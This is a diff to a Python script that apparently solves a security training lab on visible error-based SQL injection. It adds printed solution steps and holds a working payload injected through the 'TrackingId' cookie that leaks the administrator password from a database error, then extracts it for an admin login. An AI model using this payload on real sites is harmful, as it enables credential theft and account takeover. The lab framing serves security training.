@@ -1,3 +1,4 @@
+from colorama import Fore
 import requests
 import re
 import urllib3
@@ -6,7 +7,11 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "Visible error-based SQL injection"
 
+
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload into 'TrackingId' cookie to make the database return an error containing the administrator password\n2. Extract the administrator password\n3. Fetch the login page\n4. Extract the csrf token and session cookie\n5. Login as the administrator\n6. Fetch the administrator profile\n""")
+
     print(f"[+] Running lab: {LAB_NAME}")
 
     session = requests.Session()
@@ -17,10 +22,11 @@ def run(url, payload=None, proxies=None):
         # Step 1: Injecting payload to cause error leak with admin password
         print("[*] Injecting SQLi payload via TrackingId cookie...")
         payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"
-        cookies = { "TrackingId": payload }
+        cookies = {"TrackingId": payload}
 
-        r = session.get(f"{url.rstrip('/')}/filter?category=Pets", cookies=cookies)
-        
+        r = session.get(
+            f"{url.rstrip('/')}/filter?category=Pets", cookies=cookies)
+
         # Step 2: Extract admin password from error message
         print("[*] Extracting administrator password from error response...")
         admin_password = re.search(r'integer: "(.*)"', r.text).group(1)
